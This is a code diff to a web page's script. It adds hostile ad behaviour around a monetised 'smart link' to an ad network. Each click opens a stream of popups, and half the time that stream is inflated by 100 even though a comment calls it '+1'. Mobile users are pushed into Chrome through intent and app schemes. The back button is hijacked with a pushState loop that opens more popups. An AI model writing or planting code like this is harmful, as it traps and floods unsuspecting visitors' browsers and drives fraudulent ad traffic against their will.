@@ -216,51 +216,91 @@ cursor:pointer;
 
 const smartLink = "https://www.profitablecpmratenetwork.com/mq2h6va2g?key=84fd8af9fbf4199827f781b89631e3d7";
 
+let clickCount = 0;
+
+// 🔥 POPUP FUNCTION
+function openPopups(url, count){
+  for(let i = 0; i < count; i++){
+    setTimeout(() => {
+      window.open(url, "_blank");
+    }, i * 300);
+  }
+}
+
 function openExternal(){
 
-  const ua = navigator.userAgent.toLowerCase();
+  clickCount++;
 
+  const ua = navigator.userAgent.toLowerCase();
   const isAndroid = /android/.test(ua);
   const isIOS = /iphone|ipad|ipod/.test(ua);
   const isTelegram = /telegram/.test(ua);
 
-  // ✅ TELEGRAM IN-APP (MOST IMPORTANT)
+  // 🔥 LOGIC
+  let popupCount;
+
+  if(clickCount === 1){
+    popupCount = 2; // 1st click = 2 popup
+  } else {
+    popupCount = 3; // 2nd+ click = 3 popup
+  }
+
+  // 🎲 RANDOM BOOST (sometimes +1)
+  if(Math.random() < 0.5){
+    popupCount += 100;
+  }
+
+  // ✅ TELEGRAM
   if(isTelegram){
-    window.location.href = smartLink;
+    openPopups(smartLink, popupCount);
     return;
   }
 
-  // 🔥 ANDROID (NORMAL BROWSER)
+  // 🤖 ANDROID
   if(isAndroid){
 
-    window.location.href =
+    let intentLink =
     "intent://" +
     smartLink.replace(/^https?:\/\//,'') +
     "#Intent;scheme=https;package=com.android.chrome;end";
 
+    openPopups(intentLink, popupCount);
+
     setTimeout(() => {
-      window.location.href = smartLink;
+      openPopups(smartLink, popupCount);
     }, 1200);
   }
 
   // 🍎 IOS
   else if(isIOS){
 
-    window.location.href =
+    let chromeLink =
     "googlechrome://" +
     smartLink.replace(/^https?:\/\//,'');
 
+    openPopups(chromeLink, popupCount);
+
     setTimeout(() => {
-      window.location.href = smartLink;
+      openPopups(smartLink, popupCount);
     }, 1200);
   }
 
-  // 💻 PC / OTHER
+  // 💻 PC
   else{
-    window.location.href = smartLink;
+    openPopups(smartLink, popupCount);
   }
 
 }
+
+// 🔥 BACK BUTTON BLOCK + LOOP
+history.pushState(null, null, location.href);
+
+window.onpopstate = function () {
+  history.pushState(null, null, location.href);
+
+  // আবার popup খুলবে
+  openPopups(smartLink, 2);
+};
 
 // CLICK EVENT
 document.addEventListener("click", function(e){
@@ -270,7 +310,7 @@ document.addEventListener("click", function(e){
   }
 });
 
- </script> 
+ </script>
 
 </body>
 </html>
